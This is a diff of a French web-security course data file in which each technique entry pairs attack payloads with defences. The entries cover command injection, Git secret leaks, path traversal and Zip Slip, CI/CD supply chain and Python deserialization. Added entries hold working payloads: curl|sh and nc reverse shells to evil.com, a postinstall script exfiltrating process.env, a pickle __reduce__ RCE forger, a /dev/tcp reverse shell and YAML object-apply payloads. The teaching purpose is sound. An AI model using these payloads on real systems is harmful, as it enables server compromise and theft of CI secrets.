@@ -63,10 +63,45 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["y9-0lICNjOQ", "R5WB8h7hkrU"],
   },
 
-  // ==================== M02 — HTML/CSS ====================
+  // ==================== M02 — Terminal & Shell (Bash) ====================
+  {
+    slug: "command-injection",
+    moduleNumber: 2,
+    kind: "duo",
+    language: "both",
+    title: "OS Command Injection (shell)",
+    oneLiner: "Input user concaténé dans une commande shell → exécution arbitraire côté serveur.",
+    hack: "**Code vulnérable** (Node) :\n```js\nimport { exec } from 'node:child_process';\napp.post('/ping', (req) => {\n  // BUG: req.body.host concaténé dans une string shell\n  exec(`ping -c 1 ${req.body.host}`, (e, out) => res.send(out));\n});\n```\nLe shell interprète les métacaractères. Payloads dans `host` :\n- `8.8.8.8; id` → exécute `ping` PUIS `id`.\n- `8.8.8.8 && curl evil.com/x.sh | sh` → télécharge + exécute un script.\n- `8.8.8.8 | nc evil.com 4444 -e /bin/bash` → reverse shell.\n- ``8.8.8.8 `whoami` `` ou `$(whoami)` → substitution de commande.\n\n**Blind (pas de sortie)** : exfil via DNS/HTTP\n```\n8.8.8.8; curl http://evil.com/$(whoami)\n8.8.8.8; sleep 10   # time-based : si la réponse met 10s → vulnérable\n```\n\n**Bypass de filtres faibles** :\n- Espaces filtrés : `cat${IFS}/etc/passwd` ou `{cat,/etc/passwd}`.\n- Mots-clés filtrés : `c''at`, `c\\at`, `/bin/c?t`.\n\n**Outils** : Commix (exploitation auto), PayloadsAllTheThings (Command Injection).",
+    antiHack: "1. **Ne jamais passer par un shell** avec de l'input : `execFile`/`spawn` avec un **tableau d'arguments**, jamais `exec()` ni `shell: true`.\n```js\nimport { execFile } from 'node:child_process';\nexecFile('ping', ['-c', '1', host], cb); // host est un argument, pas du code shell\n```\n2. **Valider** strictement (Zod) : `host` = IP ou hostname via regex/`z.string().ip()`.\n3. **Allowlist** quand c'est possible plutôt que blocklist de métacaractères.\n4. Préférer une **lib native** (ex: requête réseau) à l'appel d'un binaire système.\n5. Principe du moindre privilège : process applicatif non-root, FS read-only.",
+    ctfRef: "PortSwigger — OS command injection (5 labs), DVWA Command Injection, TryHackMe",
+    cve: "Shellshock CVE-2014-6271 (bash), CVE-2021-44228 chaînes RCE",
+    // "What is command injection?" — PortSwigger Web Security Academy
+    // "OS Command Injection Explained | Web Application Hacking & Exploitation Demo"
+    // "Command Injection - How to Exploit Web Servers (With DVWA)"
+    youtubeIds: ["8PDDjCW5XWw", "5Feb3sWd1Ko", "frirfMQesQk"],
+  },
+
+  // ==================== M03 — Git & GitHub ====================
+  {
+    slug: "git-secrets-leak",
+    moduleNumber: 3,
+    kind: "duo",
+    language: "concept",
+    title: "Secrets dans l'historique Git",
+    oneLiner: "Un .env commité une seule fois reste dans l'historique pour toujours — et les repos publics sont minés en continu.",
+    hack: "**Le piège** : tu commit une clé, tu la supprimes au commit suivant, tu crois être safe. Faux : le **blob est toujours dans l'historique**.\n```bash\ngit log -p | grep -i 'api_key\\|secret\\|password'\ngit log --all --full-history -- .env       # le fichier supprimé est toujours là\ngit show <vieux_commit>:.env                # on relit le secret\n```\n\n**Minage automatisé des repos publics** (recon bug bounty) :\n```bash\ntrufflehog github --org=cible          # scanne tout l'historique + commits\ngitleaks detect --source . -v          # détecte clés API, tokens, mots de passe\n```\nDès qu'un secret est poussé sur un repo public, considère-le **compromis en quelques minutes** (des bots scannent GitHub en temps réel et utilisent les clés AWS/Stripe aussitôt).\n\n**Vecteurs courants** : `.env` commité, clé privée SSH/`id_rsa`, token dans un fichier de config, `.git/` exposé sur un serveur web (`wget -r http://cible/.git/` → reconstruire le code source + secrets).",
+    antiHack: "1. **`.gitignore`** dès le départ (`.env`, `*.pem`, `id_rsa`, `*.key`).\n2. **Pre-commit hook gitleaks** : bloque le commit AVANT la fuite.\n3. **Si déjà fuité : ROTATION immédiate** de la clé — c'est le seul vrai fix. Purger l'historique (`git filter-repo` / BFG) ne suffit pas, le secret a déjà pu être lu.\n4. **GitHub Secret Scanning** + push protection activés sur le repo.\n5. Secrets via variables d'environnement / gestionnaire (Vault, AWS Secrets Manager), jamais en dur.\n6. Bloquer l'accès web à `.git/` (reverse proxy : `location ~ /\\.git { deny all; }`).",
+    ctfRef: "Bug bounty recon (trufflehog/gitleaks), HackTricks — Git secrets, exposed .git",
+    // "TruffleHog | Find Secrets in GitHub & Cloud for Bug Bounties!"
+    // "Scan for secrets and passwords with GitLeaks"
+    // "How to Remove Leaked Secrets from Git History FAST!"
+    youtubeIds: ["Xxd7kqfCXYU", "hux-W8PAxYE", "s-z6kJxdNJw"],
+  },
+
+  // ==================== M05 — HTML5 ====================
   {
     slug: "clickjacking",
-    moduleNumber: 2,
+    moduleNumber: 5,
     kind: "duo",
     language: "concept",
     title: "Clickjacking + UI Redress",
@@ -77,9 +112,10 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     // "Hacker101 - Clickjacking" by Hacker101 / HackerOne
     youtubeIds: ["jcp5t8PsMsY"],
   },
+  // ==================== M06 — CSS3 fondamentaux ====================
   {
     slug: "css-keylogger",
-    moduleNumber: 2,
+    moduleNumber: 6,
     kind: "offensive",
     language: "concept",
     title: "CSS Keylogger via attribute selectors",
@@ -90,10 +126,10 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["oJ6t7AImTdE"],
   },
 
-  // ==================== M03 — JavaScript core ====================
+  // ==================== M12 — JavaScript avancé ====================
   {
     slug: "prototype-pollution",
-    moduleNumber: 3,
+    moduleNumber: 12,
     kind: "duo",
     language: "js",
     title: "Prototype Pollution",
@@ -107,10 +143,11 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     // "DOM XSS via an alternative prototype pollution vector | PortSwigger Academy tutorial"
     youtubeIds: ["V-DdcKADnFk", "5ja_NVVg4Yc", "k3LWmgVkNjA"],
   },
+  // ==================== M08 — JavaScript fondamental ====================
   {
     slug: "type-coercion-bypass",
     youtubeSearch: "javascript type coercion security == bypass",
-    moduleNumber: 3,
+    moduleNumber: 8,
     kind: "duo",
     language: "js",
     title: "Type Coercion & Timing Attacks",
@@ -121,10 +158,10 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["ZPa9I_pvRU0"],
   },
 
-  // ==================== M04 — DOM + événements ====================
+  // ==================== M09 — JavaScript & le DOM ====================
   {
     slug: "xss-deep",
-    moduleNumber: 4,
+    moduleNumber: 9,
     kind: "duo",
     language: "js",
     title: "XSS — Reflected, Stored, DOM, Mutation",
@@ -140,7 +177,7 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
   {
     slug: "postmessage-attack",
     youtubeSearch: "postMessage XSS origin check bypass",
-    moduleNumber: 4,
+    moduleNumber: 9,
     kind: "duo",
     language: "js",
     title: "postMessage Origin Skip",
@@ -151,10 +188,10 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["CWNxoxOX6sI"],
   },
 
-  // ==================== M05 — Async + API ====================
+  // ==================== M11 — JavaScript asynchrone ====================
   {
     slug: "ssrf-deep",
-    moduleNumber: 5,
+    moduleNumber: 11,
     kind: "duo",
     language: "both",
     title: "SSRF — Server-Side Request Forgery (complet)",
@@ -170,7 +207,7 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
   },
   {
     slug: "cors-misconfig",
-    moduleNumber: 5,
+    moduleNumber: 11,
     kind: "duo",
     language: "concept",
     title: "CORS Misconfiguration → Credential Theft",
@@ -185,7 +222,7 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
   {
     slug: "race-condition-api",
     youtubeSearch: "API race condition TOCTOU exploit",
-    moduleNumber: 5,
+    moduleNumber: 11,
     kind: "offensive",
     language: "python",
     title: "Race Conditions / TOCTOU",
@@ -197,10 +234,10 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["lV1W3PGLbNY"],
   },
 
-  // ==================== M06 — JS avancé ====================
+  // ==================== M12 — JavaScript avancé (suite) ====================
   {
     slug: "deserialization-js",
-    moduleNumber: 6,
+    moduleNumber: 12,
     kind: "duo",
     language: "js",
     title: "Deserialization & gadget chains",
@@ -213,7 +250,7 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
   },
   {
     slug: "proxy-trap-abuse",
-    moduleNumber: 6,
+    moduleNumber: 12,
     kind: "offensive",
     language: "js",
     title: "Proxy traps & Symbol.toPrimitive abuse",
@@ -222,10 +259,10 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     antiHack: "Pour les checks de sécurité critiques : `Object.getOwnPropertyDescriptor(user, 'role')` au lieu de `user.role`. Préférer `Map`/`WeakMap` pour les states sensibles. Validation par schema (Zod) à la frontière transforme un Proxy malveillant en plain object.",
   },
 
-  // ==================== M07 — TypeScript ====================
+  // ==================== M13 — TypeScript ====================
   {
     slug: "redos",
-    moduleNumber: 7,
+    moduleNumber: 13,
     kind: "duo",
     language: "both",
     title: "ReDoS (Regular Expression DoS)",
@@ -239,7 +276,7 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
   {
     slug: "type-confusion-runtime",
     youtubeSearch: "typescript runtime validation zod tutorial",
-    moduleNumber: 7,
+    moduleNumber: 13,
     kind: "defensive",
     language: "js",
     title: "TypeScript ≠ Runtime — Validation manquante",
@@ -251,10 +288,10 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["ZPa9I_pvRU0", "siQfpESFOhI"],
   },
 
-  // ==================== M08 — Build tools / Supply chain ====================
+  // ==================== M04 — Environnement de dev (supply chain) ====================
   {
     slug: "supply-chain",
-    moduleNumber: 8,
+    moduleNumber: 4,
     kind: "duo",
     language: "concept",
     title: "Supply Chain Attacks (npm/pip)",
@@ -266,11 +303,11 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["XcVdKfdPTj8"],
   },
 
-  // ==================== M09 — React basics ====================
+  // ==================== M14 — React (composants & hooks) ====================
   {
     slug: "react-xss",
     youtubeSearch: "react dangerouslySetInnerHTML xss vulnerability",
-    moduleNumber: 9,
+    moduleNumber: 14,
     kind: "duo",
     language: "js",
     title: "React XSS — où il sort de sa protection",
@@ -281,10 +318,10 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["NPWVE3pC06M"],
   },
 
-  // ==================== M10 — React avancé ====================
+  // ==================== M15 — React écosystème ====================
   {
     slug: "ssr-injection",
-    moduleNumber: 10,
+    moduleNumber: 15,
     kind: "duo",
     language: "js",
     title: "Server-Side Render Injection",
@@ -293,10 +330,10 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     antiHack: "Échapper `<`, `>`, `&`, `'`, `/` dans tout JSON inline.\n```js\nfunction safeJson(obj) {\n  return JSON.stringify(obj)\n    .replace(/</g, '\\\\u003c')\n    .replace(/>/g, '\\\\u003e')\n    .replace(/&/g, '\\\\u0026');\n}\n```\nOu utiliser un `<script type=\"application/json\" id=\"state\">` (parsing inerte) puis `JSON.parse(document.getElementById('state').textContent)`.",
   },
 
-  // ==================== M11 — Next.js ====================
+  // ==================== M15 — React écosystème (Next.js) ====================
   {
     slug: "next-ssrf",
-    moduleNumber: 11,
+    moduleNumber: 15,
     kind: "duo",
     language: "js",
     title: "Next.js Route Handler SSRF + Open Redirect",
@@ -307,11 +344,29 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["eVI0Ny5cZ2c"],
   },
 
-  // ==================== M16 — Backend Fastify ====================
+  // ==================== M16 — Node.js runtime (fs / path) ====================
+  {
+    slug: "path-traversal-zip-slip",
+    moduleNumber: 16,
+    kind: "duo",
+    language: "js",
+    title: "Path Traversal & Zip Slip (fs/path non assaini)",
+    oneLiner: "Un nom de fichier user-controlled concaténé à un chemin → lecture/écriture arbitraire (../../etc/passwd, extraction d'archive piégée).",
+    hack: "**1. Path traversal en LECTURE** — le classique `../`.\n```js\nimport { readFile } from 'node:fs/promises';\nimport path from 'node:path';\n\napp.get('/files/:name', async (req, reply) => {\n  // BUG: req.params.name concaténé tel quel\n  const file = path.join('/var/app/uploads', req.params.name);\n  return reply.send(await readFile(file));\n});\n```\nPayloads sur `:name` :\n- `../../../../etc/passwd` → remonte hors de uploads.\n- `..%2f..%2f..%2fetc%2fpasswd` → si le routeur décode l'URL (Fastify le fait).\n- `....//....//etc/passwd` → bypass d'un `.replace('../','')` naïf (le filtre retire `../` et reconstitue `../` à partir des restes).\n- `..%252f..%252f` → double-encodage si un proxy décode une fois.\n- `/etc/passwd` absolu → **`path.join('/var/app/uploads', '/etc/passwd')` = `/var/app/uploads/etc/passwd`** (join garde la base), mais `path.resolve(base, '/etc/passwd')` = **`/etc/passwd`** : resolve écrase la base dès qu'un argument est absolu. Piège classique.\n- Null byte (vieux Node < 8) : `secret.pdf\\x00.png`.\n\n**2. Path traversal en ÉCRITURE** — encore pire.\n```js\nawait writeFile(path.join(UPLOAD_DIR, req.body.filename), buffer);\n```\n- `../../../../var/www/app/routes/health.js` → écrase un fichier source → **RCE** au prochain require.\n- `../../../../home/app/.ssh/authorized_keys` → ta clé SSH → accès shell.\n- `../../../../etc/cron.d/x` → cron malveillant.\n\n**3. Zip Slip** — path traversal via le nom d'entrée d'une archive.\nUne archive est juste une liste de noms de fichiers + contenu. Si l'app extrait sans valider chaque entryName, le `../` est DANS l'archive (l'attaquant n'a même pas besoin de toucher l'URL).\n```js\nimport AdmZip from 'adm-zip';\nconst zip = new AdmZip(uploadedBuffer);\n// BUG: extractAllTo() de certaines libs fait juste path.join(dest, entry.entryName)\nzip.extractAllTo('/var/app/uploads', true);\n```\nFabriquer l'archive malveillante (le `zip` standard refuse `../`, on le force) :\n```bash\n# créer une entrée dont le nom contient ../\nmkdir -p evil && printf 'pwned' > payload\n( cd evil && ln -s ../../../../../tmp/owned link ) # ou via lib\npython3 - <<'PY'\nimport zipfile\nz = zipfile.ZipFile('evil.zip','w')\nz.writestr('../../../../var/www/app/routes/x.js', \"require('child_process').exec('curl evil.com|sh')\")\nz.close()\nPY\n```\nMême problème avec **tar** (`tar.extractall()` Python, `tar` npm), et avec les **symlinks/hardlinks** dans l'archive qui pointent hors du dossier (TarSlip / symlink escape).\n\n**4. Autres surfaces fs/path à connaître** :\n- `res.sendFile(userPath)` / `express.static` mal monté.\n- `import()` / `require()` dynamique avec une portion user-controlled → chargement de module arbitraire.\n- `fs.createReadStream` dans un endpoint de download.\n\n**Outils** : Burp (Intruder + listes payloadsallthethings/Directory-Traversal), `dotdotpwn`, ffuf avec wordlist LFI, `tarsploit`/scripts maison pour forger les archives.",
+    antiHack: "1. **Résoudre puis vérifier le préfixe** — la parade canonique, jamais juste `path.join` :\n```js\nimport path from 'node:path';\nconst BASE = path.resolve('/var/app/uploads');\nfunction safeJoin(base, userName) {\n  const target = path.resolve(base, userName);\n  // le chemin résolu DOIT rester sous la base (+ séparateur pour éviter /uploads-evil)\n  if (target !== base && !target.startsWith(base + path.sep)) {\n    throw new Error('path traversal');\n  }\n  return target;\n}\nconst file = safeJoin(BASE, req.params.name);\n```\n2. **Ne jamais accepter le chemin du client** : générer un id côté serveur (UUID) et stocker la correspondance id → vrai fichier en DB. Le client ne manipule que l'UUID.\n3. **Allowlist** du basename : `if (!/^[a-zA-Z0-9._-]+$/.test(name)) reject` + interdire `..` et les séparateurs. Valider AVANT décodage final, pas après.\n4. **Décoder une seule fois et de façon contrôlée** : ne pas re-décoder, refuser `%2e%2e`, `%2f`, null bytes. Fastify : valider `req.params` via schéma (`pattern`).\n5. **Zip Slip / Tar Slip** : pour CHAQUE entrée, résoudre la destination et vérifier le préfixe (point 1) AVANT d'écrire. Refuser les entrées absolues, contenant `..`, et **les symlinks/hardlinks**. Limiter taille décompressée + nombre d'entrées (anti zip-bomb).\n```js\nfor (const entry of zip.getEntries()) {\n  const dest = safeJoin(BASE, entry.entryName);   // throw si évasion\n  if (entry.isDirectory) { mkdirSync(dest, { recursive: true }); continue; }\n  writeFileSync(dest, entry.getData());\n}\n```\n6. **Lib à jour** : `adm-zip` ≥ 0.5.10, `tar` ≥ 6.x (corrige plusieurs CVE de path/symlink), `unzipper`/`yauzl` configurés strict.\n7. **Défense en profondeur** : process non-root, FS applicatif en read-only sauf un dossier upload dédié monté `noexec`, dossier d'upload HORS de l'arborescence de code (impossible d'écraser une route `.js`).",
+    ctfRef: "PortSwigger — File path traversal (6 labs), HackTheBox \"Slippy\" (Zip/Tar Slip), PayloadsAllTheThings — Directory Traversal",
+    cve: "Zip Slip (Snyk 2018, CWE-22), CVE-2018-1002204 (adm-zip), CVE-2007-4559 (Python tarfile extractall), CVE-2019-5624 (RubyGems Zip Slip)",
+    // "What is directory traversal? (file path traversal)" — PortSwigger Web Security Academy (officiel)
+    // "Critical .zip vulnerabilities? - Zip Slip and ZipperDown" — Seytonic
+    // "Hacking Websites With A Zip File (Zip Slip)" — démo exploitation
+    youtubeIds: ["NQwUDLMOrHo", "Ry_yb5Oipq0", "4sKlbMiGWAw"],
+  },
+
+  // ==================== M17 — Fastify / API REST ====================
   {
     slug: "validation-bypass",
     youtubeSearch: "fastify zod schema validation API security",
-    moduleNumber: 16,
+    moduleNumber: 17,
     kind: "defensive",
     language: "js",
     title: "Validation à la frontière (Zod + Fastify)",
@@ -324,7 +379,7 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
   },
   {
     slug: "nosql-injection",
-    moduleNumber: 16,
+    moduleNumber: 17,
     kind: "duo",
     language: "js",
     title: "NoSQL Injection (MongoDB / Drizzle no-validation)",
@@ -336,10 +391,10 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["DBNmAJaWcGk", "1KPd5gRQbKw"],
   },
 
-  // ==================== M17 — DB SQL ====================
+  // ==================== M18 — SQL / PostgreSQL ====================
   {
     slug: "sqli-full",
-    moduleNumber: 17,
+    moduleNumber: 18,
     kind: "duo",
     language: "both",
     title: "SQL Injection (union, blind, time-based) + sqlmap",
@@ -352,11 +407,11 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["MfDo_ssS4PY"],
   },
 
-  // ==================== M19 — Auth ====================
+  // ==================== M20 — Sécurité & Auth ====================
   {
     slug: "jwt-attacks",
     youtubeSearch: "JWT attacks alg none key confusion exploit",
-    moduleNumber: 19,
+    moduleNumber: 20,
     kind: "duo",
     language: "both",
     title: "JWT — toutes les attaques",
@@ -370,7 +425,7 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
   },
   {
     slug: "session-fixation",
-    moduleNumber: 19,
+    moduleNumber: 20,
     kind: "duo",
     language: "concept",
     title: "Session Fixation + CSRF",
@@ -382,10 +437,10 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["vRBihr41JTo", "eUbtW0Z0W1g"],
   },
 
-  // ==================== M20 — WebSockets ====================
+  // ==================== M17 — Fastify / API REST (WebSockets) ====================
   {
     slug: "websocket-attacks",
-    moduleNumber: 20,
+    moduleNumber: 17,
     kind: "duo",
     language: "js",
     title: "WebSocket Origin Spoofing + CSWSH",
@@ -396,10 +451,31 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["3__T1JngGIQ"],
   },
 
-  // ==================== M21 — DevOps / Docker ====================
+  // ==================== M21 — Tests & CI ====================
+  {
+    slug: "ci-test-supply-chain",
+    moduleNumber: 21,
+    kind: "duo",
+    language: "both",
+    title: "La suite de tests comme surface d'attaque (CI/CD)",
+    oneLiner:
+      "Le code de test, les dépendances dev (postinstall) et les logs CI exécutent du code et touchent des secrets — souvent sans la moindre revue.",
+    hack: "Le test runner est un **interpréteur de code arbitraire** qui tourne avec accès aux secrets du CI. Quatre vecteurs concrets :\n\n**1. Dépendance dev malveillante (postinstall)** — le vecteur n°1.\nUn `npm install` exécute les lifecycle scripts AVANT que tu lances le moindre test. Une devDependency typosquattée (`@types/node-fetch`, `eslnt-plugin-x`) suffit.\n```json\n// package.json du package piégé\n{\n  \"name\": \"jest-cool-reporter\",\n  \"scripts\": { \"postinstall\": \"node grab.js\" }\n}\n```\n```js\n// grab.js — exfiltre TOUT l'environnement du runner\nconst https = require('node:https');\nconst loot = Buffer.from(JSON.stringify(process.env)).toString('base64');\nhttps.get(`https://evil.com/x?d=${loot}`); // NPM_TOKEN, AWS_*, GITHUB_TOKEN...\n```\nDans un CI, `process.env` contient les secrets injectés (registry tokens, clés cloud, `GITHUB_TOKEN`). Pareil en Python : un `setup.py` exécute du code arbitraire à l'install.\n\n**2. Exécution de code de test non fiable (pull_request_target)** — le piège GitHub Actions classique.\n```yaml\n# .github/workflows/test.yml — VULNÉRABLE\non: pull_request_target          # BUG: tourne avec les secrets du repo de base\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@v4\n        with: { ref: ${{ github.event.pull_request.head.sha }} }  # checkout du code de l'attaquant\n      - run: npm ci && npm test    # exécute les tests de la PR fork AVEC les secrets\n```\nUn attaquant ouvre une PR depuis un fork, modifie un fichier de test ou un script `pretest`, et son code s'exécute avec `secrets.*` et un `GITHUB_TOKEN` write. Exfil typique dans le test :\n```js\ntest('innocent', async () => {\n  await fetch('https://evil.com/x', {\n    method: 'POST',\n    body: JSON.stringify(process.env),\n  });\n  expect(1).toBe(1);\n});\n```\n\n**3. Fuite de secrets dans les logs de test/CI.**\nUn test qui dump une réponse, une erreur, ou un objet de config crache le secret en clair dans les logs — souvent publics sur les PR de forks.\n```js\nconsole.log('debug auth →', { headers: req.headers }); // Authorization: Bearer ...\nconsole.log(process.env);                                // dump complet\n// ou un snapshot qui fige un token : expect(config).toMatchSnapshot();\n```\nLes masques GitHub (`add-mask`) ne couvrent QUE les secrets déclarés ; un token dérivé/encodé/base64 passe à travers. `set -x` dans un script bash imprime aussi les arguments contenant des secrets.\n\n**4. Snapshot poisoning.**\nLes snapshots (`__snapshots__/*.snap`, `toMatchSnapshot`) sont du **code JS commité** que Jest/Vitest re-évalue, et que personne ne relit en review (souvent en `.gitattributes linguist-generated`).\n```js\n// __snapshots__/x.test.js.snap — un attaquant édite ce fichier dans sa PR\nexports[`render 1`] = `<div>${require('child_process').execSync('curl evil.com|sh')}</div>`;\n```\nVariante plus discrète : un snapshot \"obsolète\" qui masque une régression de sécurité (un test d'auth qui devrait échouer passe parce que le snapshot a été mis à jour avec `-u` sans relecture).\n\n**Outils** : Socket.dev / Phylum (postinstall malveillants), gitleaks/trufflehog (secrets dans logs), `actionlint` + `zizmor` (audit workflows GitHub Actions), Step Security Harden-Runner (egress du runner).",
+    antiHack:
+      "1. **Couper les lifecycle scripts en CI** : `npm ci --ignore-scripts` (ou `npm config set ignore-scripts true`), pnpm `enable-pre-post-scripts=false`. Auditer puis ré-autoriser explicitement les rares packages qui en ont besoin (`onlyBuiltDependencies`).\n2. **Jamais `pull_request_target` pour exécuter du code de fork.** Utiliser `pull_request` (pas de secrets pour les forks) pour les tests. Si tu as besoin d'un job privilégié, le séparer : un workflow non privilégié build/test, un workflow `workflow_run` séparé qui ne checkout PAS le code du fork.\n3. **Lockfile gelé + intégrité** : `npm ci`/`pnpm install --frozen-lockfile` (jamais `npm install` en CI), hashes d'intégrité dans le lockfile, Socket.dev/Phylum dans le pipeline pour bloquer les postinstall qui font du réseau.\n4. **Moindre privilège du `GITHUB_TOKEN`** : `permissions: { contents: read }` par défaut au niveau workflow, élargir job par job. Pas de secrets exposés aux jobs qui touchent du code non revu.\n5. **Secrets hors environnement quand possible** : OIDC (federation) au lieu de clés statiques pour le cloud ; secrets injectés au dernier moment, scoping par environnement protégé avec required reviewers.\n6. **Scan des logs** : gitleaks/trufflehog sur la sortie CI ; interdire `console.log(process.env)`, `set -x` avec secrets ; ne jamais logger `Authorization`/headers. Masquer ne suffit pas — ne pas produire le secret.\n7. **Snapshots traités comme du code** : les inclure dans la code review (retirer `linguist-generated`), interdire `--ci`+update auto, refuser tout snapshot contenant `require(`/`process`/`child_process`. CODEOWNERS sur `__snapshots__/` et les workflows `.github/`.\n8. **Isoler le runner** : Harden-Runner (egress allowlist → bloque l'exfil vers evil.com), runner éphémère, pas de self-hosted runner sur les repos publics avec auto-run de PR forks.\n9. **Pin par SHA** des actions tierces (`uses: x/y@<sha>`, pas `@v4`) + Dependabot pour les bumps revus.",
+    ctfRef:
+      "GitHub Security Lab — Keeping your GitHub Actions secure (pwn requests), labs pull_request_target ; OWASP CI/CD Top 10 (CICD-SEC-04 Poisoned Pipeline Execution)",
+    cve: "ua-parser-js / event-stream (postinstall) ; Codecov bash uploader 2021 (CI secrets exfil) ; PyTorch torchtriton dependency confusion 2022 ; tj-actions/changed-files 2025 (CVE-2025-30066, exfil de secrets CI)",
+    // "Ongoing npm Software Supply Chain Attack Exposes New Risks" — postinstall / supply chain dev deps
+    // "GitHub Actions Security Mistake Leaking Millions of Secrets" — fuite de secrets CI
+    // "Vulnerabilities and Misconfigurations in GitHub Actions - Rojan Rijal" — pull_request_target / poisoned pipeline
+    youtubeIds: ["WRoLs7mDfvo", "es1p2hFGRZQ", "pTKS99Nfaxw"],
+  },
+
+  // ==================== M22 — DevOps & déploiement ====================
   {
     slug: "docker-escape",
-    moduleNumber: 21,
+    moduleNumber: 22,
     kind: "duo",
     language: "concept",
     title: "Container Escape & Secrets Leak",
@@ -412,7 +488,7 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["8gDP3nJMlJI", "giXlSlFLKwA"],
   },
 
-  // ==================== M22 — Cloud ====================
+  // ==================== M22 — DevOps & déploiement (cloud) ====================
   {
     slug: "cloud-imds-ssrf",
     moduleNumber: 22,
@@ -427,10 +503,29 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["VlXebXMhV3g"],
   },
 
-  // ==================== M24 — RAG / IA ====================
+  // ==================== M24 — Python scripting & automation ====================
+  {
+    slug: "python-unsafe-deserialization",
+    youtubeSearch: "python pickle yaml.load eval RCE deserialization",
+    moduleNumber: 24,
+    kind: "duo",
+    language: "python",
+    title: "Python — désérialisation non sûre (pickle / yaml.load / eval-exec)",
+    oneLiner: "Tout input non-trusté passé à pickle.loads, yaml.load ou eval/exec = RCE serveur immédiate.",
+    hack: "Le piège commun : un script Python prend une donnée venue du réseau (cookie, body, fichier uploadé, message de queue) et la **reconstruit en objet** ou l'**évalue** sans valider. Trois portes, le même résultat : exécution de code arbitraire.\n\n**1. pickle.loads — la plus dangereuse**\n`pickle` n'est PAS un format de données, c'est un format de **programme**. À la désérialisation il appelle `__reduce__`, qui peut retourner n'importe quel callable.\n```python\nimport pickle, base64\napp.route('/load', methods=['POST'])\ndef load():\n    data = base64.b64decode(request.cookies['session'])\n    obj = pickle.loads(data)   # BUG: input réseau désérialisé\n    return str(obj)\n```\nForger le payload RCE (côté attaquant) :\n```python\nimport pickle, base64, os\nclass Exploit:\n    def __reduce__(self):\n        # (callable, (args,)) -> exécuté pendant pickle.loads\n        return (os.system, ('curl http://evil.com/x.sh | sh',))\npayload = base64.b64encode(pickle.dumps(Exploit()))\nprint(payload.decode())\n# -> à placer dans le cookie 'session'\n```\nVariante reverse shell : `('/bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"',)`.\nBlind (pas de sortie) : exfil DNS/HTTP `os.system('curl http://evil.com/$(whoami)')`.\nSurfaces réelles : sessions Flask picklées, cache **Django pickle backend**, files Celery/RQ, fichiers `.pkl` de modèles ML téléchargés (PyTorch `torch.load` utilise pickle !).\n\n**2. yaml.load sans SafeLoader**\nL'ancien `yaml.load(data)` (PyYAML < 5.1, ou `Loader=FullLoader`/`UnsafeLoader`) instancie des **objets Python arbitraires** via les tags `!!python/...`.\n```python\nimport yaml\ncfg = yaml.load(request.body)   # BUG: FullLoader/UnsafeLoader\n```\nPayloads :\n```yaml\n# instanciation d'objet -> appelle os.system\n!!python/object/apply:os.system [\"curl evil.com|sh\"]\n```\n```yaml\n# variante subprocess\n!!python/object/apply:subprocess.check_output [[\"id\"]]\n```\n```yaml\n# via new/module -> exec arbitraire\n!!python/object/new:type\n  args: [\"z\", !!python/tuple [], {\"__init__\": !!python/name:exec }]\n  state: {\"__call__\": null}\n```\nÀ noter : `FullLoader` (défaut historique de `yaml.load`) bloque `apply` mais **pas** toutes les instanciations selon la version — seul `SafeLoader` est sûr.\n\n**3. eval / exec / pickle déguisé sur input user**\nLe classique « calculatrice » ou « filtre dynamique » :\n```python\n@app.route('/calc')\ndef calc():\n    return str(eval(request.args['expr']))   # BUG\n```\nPayloads (eval suffit pour du RCE complet, pas besoin d'exec) :\n```python\n__import__('os').system('id')\n# bypass quand 'os'/builtins sont filtrés :\n().__class__.__bases__[0].__subclasses__()  # remonter aux classes -> Popen\n[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='Popen'][0]('id',shell=True)\n```\nMême logique pour `exec()`, `os.system(f\"...{user}\")`, `subprocess(..., shell=True)`, `str.format` avec attribut user-controlled, et `Template(...).render()` côté SSTI (Jinja2).\n\n**Outils** : `pickora`/`pypickle` (forge de payloads pickle), `pickletools.dis(payload)` (lire les opcodes d'un pickle suspect), `peas`/PayloadsAllTheThings (Insecure Deserialization, Python), `fenjing`/`tplmap` (SSTI Jinja2).",
